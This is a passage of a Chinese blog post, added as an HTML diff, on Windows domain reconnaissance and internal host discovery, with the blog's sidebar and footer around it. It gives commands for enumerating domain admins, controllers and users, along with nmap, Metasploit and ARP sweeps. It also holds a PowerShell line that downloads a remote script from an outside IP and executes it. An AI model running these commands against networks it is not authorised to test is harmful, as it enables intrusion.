+<span class="ln">17</span><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;Enterprise admins&#34;</span> <span class="p">/</span><span class="n">domain</span>
+<span class="ln">18</span>
+<span class="ln">19</span><span class="c">#查看域控制器</span>
+<span class="ln">20</span><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;domain controllers&#34;</span> <span class="p">/</span><span class="n">domain</span>
+<span class="ln">21</span>
+<span class="ln">22</span><span class="c">#对比查看&#34;工作站域DNS名称(域名)&#34;和&#34;登录域()域控制器&#34;的信息是否相匹配</span>
+<span class="ln">23</span><span class="n">net</span> <span class="n">config</span> <span class="n">workstation</span>
+<span class="ln">24</span>
+</code></pre></div><h3 id="03dsquery">03dsquery</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一dsquery</span>
+<span class="ln"> 2</span><span class="n">dsquery</span> <span class="n">computer</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查看当前域中的所有账户名</span>
+<span class="ln"> 5</span><span class="n">dsquery</span> <span class="n">user</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#查看当前域内的所有组名</span>
+<span class="ln"> 8</span><span class="n">dsquery</span> <span class="nb">group
+</span><span class="ln"> 9</span><span class="nb"></span>
+<span class="ln">10</span><span class="c">#查看到当前域所在的网段，结合nbtscan使用</span>
+<span class="ln">11</span><span class="n">dsquery</span> <span class="n">subnet</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="c">#查看域内所有的web站点</span>
+<span class="ln">14</span><span class="n">dsquery</span> <span class="n">site</span>
+<span class="ln">15</span>
+<span class="ln">16</span><span class="c">#查看当前域中的服务器(一般结果只有域控的主机名)</span>
+<span class="ln">17</span><span class="n">dsquery</span> <span class="n">server</span>
+<span class="ln">18</span>
+<span class="ln">19</span><span class="c">#查询前240个以admin开头的用户名</span>
+<span class="ln">20</span><span class="n">dsquery</span> <span class="n">user</span> <span class="n">domainroot</span> <span class="n">-name</span> <span class="n">admin</span><span class="p">*</span> <span class="n">-limit</span> <span class="n">240</span>
+<span class="ln">21</span>
+</code></pre></div><h3 id="04other">04Other</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#查看域内信任关系</span>
+<span class="ln"> 2</span><span class="n">nltest</span> <span class="p">/</span><span class="n">domain_trusts</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查看域控制器的机器名</span>
+<span class="ln"> 5</span><span class="n">nltest</span> <span class="p">/</span><span class="n">DCLIST</span><span class="err">:</span><span class="n">MINGY</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#查看域内邮件服务器</span>
+<span class="ln"> 8</span><span class="n">nslookup</span> <span class="n">-q</span><span class="p">=</span><span class="n">mx</span> <span class="n">mingy</span><span class="p">.</span><span class="n">com</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c">#查看域内DNS服务器</span>
+<span class="ln">11</span><span class="n">nslookup</span> <span class="n">-q</span><span class="p">=</span><span class="n">ns</span> <span class="n">mingy</span><span class="p">.</span><span class="n">com</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="c">#查看域内的主域控，仅限win2008及之后的系统</span>
+<span class="ln">14</span><span class="n">netdom</span> <span class="n">query</span> <span class="n">pdc</span>
+</code></pre></div><h3 id="05定位域控">05定位域控</h3>
+<p>端口识别重要。DNS是域控的标志</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#ipconfig</span>
+<span class="ln"> 2</span><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查询dns解析记录</span>
+<span class="ln"> 5</span><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">all_ldap</span><span class="p">.</span><span class="n">_tcp</span><span class="p">.</span><span class="n">dc</span><span class="p">.</span><span class="n">_msdcs</span><span class="p">.</span><span class="n">mingy</span><span class="p">.</span><span class="n">com</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#spn扫描</span>
+<span class="ln"> 8</span><span class="c">#在SPN扫描结果中可以通过如下内容，来进行域控的定位。</span>
+<span class="ln"> 9</span><span class="n">setspn</span> <span class="n">-q</span> <span class="p">*/*</span>
+<span class="ln">10</span><span class="n">setspn</span> <span class="n">-T</span> <span class="n">mingy</span><span class="p">.</span><span class="n">com</span> <span class="n">-q</span> <span class="p">*</span> <span class="p">/*</span>
+<span class="ln">11</span>
+<span class="ln">12</span><span class="n">CN</span><span class="p">=</span><span class="n">DC</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">mingy</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">com</span>
+<span class="ln">13</span>
+<span class="ln">14</span><span class="c">#net group </span>
+<span class="ln">15</span><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;domain control&#34;</span> <span class="p">/</span><span class="n">domain</span>
+</code></pre></div><p>端口识别</p>
+<ul>
+<li>
+<p>端口:389</p>
+<p>服务:LDAP、ILS
+说明:轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
+</li>
+<li>
+<p>端口:53
+服务:Domain Name Server (DNS)
+说明:53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
+</li>
+</ul>
+<h2 id="内网存活探测">内网存活探测</h2>
+<h3 id="01netbios协议探测">01Netbios协议探测</h3>
+<p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编秏程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用WINLmhost文件等多种模式将NetBlOS名——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="c1">#nmap</span>
+<span class="ln">2</span>nmap -sU -T4 --script nbstat.nse -p137 10.10.10.0/24
+<span class="ln">3</span>
+<span class="ln">4</span><span class="c1">#msf</span>
+<span class="ln">5</span>msf&gt; use auxiliary/scanner/netbios/nbname
+</code></pre></div><p>Nbtscan:</p>
+<p>项目地址:http://www.unixwiz.net/tools/nbtscan.html
+使用nbtscan扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器
+输出的结果第一列为IP地址，第二列为机器名和所在域的名称，第三列即最后一列为及其所开启的服务的列表。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="c1">#windows</span>
+<span class="ln">2</span>nbtscan.exe -m 10.10.10.0/24
+<span class="ln">3</span>nbtstat -n
+<span class="ln">4</span>
+<span class="ln">5</span><span class="c1">#linux</span>
+<span class="ln">6</span>nbtscan -r 10.10.10.0/24
+</code></pre></div><h3 id="02icmp协议探测">02ICMP协议探测</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="c">#命令行直接执行扫描</span>
+<span class="ln">2</span><span class="k">for</span> <span class="p">/</span><span class="n">l</span> <span class="k">%</span><span class="n">i</span> <span class="k">in</span> <span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">255</span><span class="p">)</span> <span class="k">do</span> <span class="p">@</span> <span class="n">ping</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="k">%</span><span class="n">i</span> <span class="n">-w</span> <span class="n">1</span> <span class="n">-n</span> <span class="n">1</span> <span class="p">|</span> <span class="n">find</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&#34;ttl=&#34;</span>
+<span class="ln">3</span>
+<span class="ln">4</span><span class="c">#输出内容导出</span>
+<span class="ln">5</span><span class="k">for</span> <span class="p">/</span><span class="n">l</span> <span class="k">%</span><span class="n">i</span> <span class="k">in</span> <span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">255</span><span class="p">)</span> <span class="k">do</span> <span class="p">@</span> <span class="n">ping</span> <span class="n">-n</span> <span class="n">1</span> <span class="n">-w</span> <span class="n">40</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="k">%</span><span class="n">i</span> <span class="p">&amp;</span> <span class="k">if</span> <span class="n">errorlevel</span> <span class="n">1</span> <span class="p">(</span><span class="nb">echo </span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="k">%</span><span class="n">i</span><span class="p">&gt;&gt;</span><span class="n">c:</span><span class="p">\</span><span class="n">a</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="k">else</span><span class="p">(</span><span class="nb">echo </span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="k">%</span><span class="n">i</span><span class="p">&gt;&gt;</span><span class="n">c:</span><span class="p">\</span><span class="n">b</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
+<span class="ln">6</span>
+<span class="ln">7</span><span class="c">#nmap扫描一个C段下存活的主机（PE表示强制ping）</span>
+<span class="ln">8</span><span class="n">nmap</span> <span class="n">-sn</span> <span class="n">-PE</span> <span class="n">-T4</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span>
+</code></pre></div><h3 id="03udp协议探测">03UDP协议探测</h3>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>Unicornscan -mU 192.168.1.100
+</code></pre></div><h3 id="04arp协议探测">04ARP协议探测</h3>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln"> 1</span><span class="c1">#nmap</span>
+<span class="ln"> 2</span>nmap -sn -PR 192.168.1.1/24
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c1">#msf</span>
+<span class="ln"> 5</span>msf&gt; use auxiliary/scanner/discovery/arp_sweep
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c1">#arp-scan(linux: http://linux.die.net/man/1/arp-scan)</span>
+<span class="ln"> 8</span>arp-scan -interface<span class="o">=</span>eth1 --localnet
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c1">#arp-scan(windows: https//github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan)</span>
+<span class="ln">11</span>arp-scan.exe -t 10.10.10.0/24
+</code></pre></div><h3 id="05smb协议探测">05SMB协议探测</h3>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="c1">#msf</span>
+<span class="ln">2</span>Msf5&gt; use auxiliary/scanner/smb/smb_version
+</code></pre></div><h3 id="06域内端口探测">06域内端口探测</h3>
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/c3fdf5e5dta8612d0a17636dbb096604e987ab31/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/c3fdf5e5dta8612d0a17636dbb096604e987ab31/Scan/Invoke-PortScan.ps1</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="c">#msf</span>
+<span class="ln">2</span><span class="n">use</span> <span class="n">auxiliary</span><span class="p">/</span><span class="n">scammer</span><span class="p">/</span><span class="n">portscan</span><span class="p">/</span><span class="n">syn</span>
+<span class="ln">3</span>
+<span class="ln">4</span><span class="c">#Nishang中的Invoke-PortScan模块</span>
+<span class="ln">5</span><span class="n">powershell</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://47.104.255.11:8000/Invoke-PortScan.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PortScan</span> <span class="n">-StartAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">1</span> <span class="n">-EndAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">255</span> <span class="n">-ResolveHost</span> <span class="n">-ScanPort</span>
+</code></pre></div></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/tech/windows/">Windows密码凭证获取
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/tech/windows-2/">域内凭据获取
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/bin/subarashikihibi-1/">素晴日剧本片段
+</a></li><li><a href="/posts/tech/gal-extract/">记第一次从gal中解包提取素材和剧本
+</a></li><li><a href="/bin/free-talk/">杂谈——阿西莫夫的小说&amp;简奥斯汀所处的时代&amp;1984
+</a></li><li><a href="/posts/others/lighting-ball/">《球状闪电》
+</a></li><li><a href="/posts/others/stolz/">Stolz定理和一道例题
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile4.jpg" alt="リソウナジダイ" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">リソウナジダイ</h5><div class="profile-bio mb-2">バカです　何度もバカだって言ってるじゃないですか</div><div class="profile-company mb-2"><i class="fas fa-fw fa-building"></i>挣钱只为抽老婆</div><div class="profile-about mb-2"><i class="fas fa-fw fa-info-circle"></i><a  href="/about/">关于</a></div>
+      </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/intranet-3/">Socket代理
+</a></li><li><a href="/posts/tech/intranet-2/">内网文件传输
+</a></li><li><a href="/posts/tech/shell/">反弹shell
+</a></li><li><a href="/posts/tech/linux/">Linux主机信息收集
+</a></li><li><a href="/posts/tech/windows-2/">域内凭据获取
+</a></li><li><a href="/posts/tech/intranet/">Windows内网信息收集
+</a></li><li><a href="/posts/tech/windows/">Windows密码凭证获取
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="打怪升级">
+          打怪升级 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a><a href="/categories/%E8%AF%AD%E8%A8%80%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="语言类">
+          语言类 <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">10</span>
+        </a><a href="/series/%E4%B9%A6%E7%B1%8D%E7%89%87%E6%AE%B5/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="书籍片段">
+          书籍片段 <span class="badge rounded-pill">6</span>
+        </a></div>
+    </section><section class="taxonomy-tags row surface">
+      <h4>
+        <a href="/tags">标签</a>
+      </h4>
+      <div><a href="/tags/kalafina/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="kalafina">
+          kalafina <span class="badge rounded-pill">5</span>
+        </a><a href="/tags/%E7%99%BD%E8%89%B2%E7%9B%B8%E7%B0%BF2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="白色相簿2">
+          白色相簿2 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%A7%BD%E7%BF%BC%E7%9A%84%E5%B0%A4%E6%96%AF%E7%BC%87%E4%BA%9A/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="秽翼的尤斯缇亚">
+          秽翼的尤斯缇亚 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%B0%8F%E5%9C%86/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="魔法少女小圆">
+          魔法少女小圆 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="百年孤独">
+          百年孤独 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E7%A9%BA%E4%B9%8B%E5%A2%83%E7%95%8C/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="空之境界">
+          空之境界 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E8%8B%B1%E5%9B%BD%E5%8F%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="英国史">
+          英国史 <span class="badge rounded-pill">2</span>
+        </a><a href="/tags/fate/zero/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="fate/zero">
+          fate/zero <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/magisk/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="magisk">
+          magisk <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%8F%8D%E5%8F%9B%E7%9A%84%E9%B2%81%E8%B7%AF%E4%BF%AE/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="反叛的鲁路修">
+          反叛的鲁路修 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%B0%91%E5%A5%B3%E7%90%86%E8%AE%BA%E5%8F%8A%E5%85%B6%E5%91%A8%E8%BE%B9/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="少女理论及其周边">
+          少女理论及其周边 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E6%96%A9%E8%B5%A4%E7%B4%85%E4%B9%8B%E7%9E%B3/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="斩·赤紅之瞳！">
+          斩·赤紅之瞳！ <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2023 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
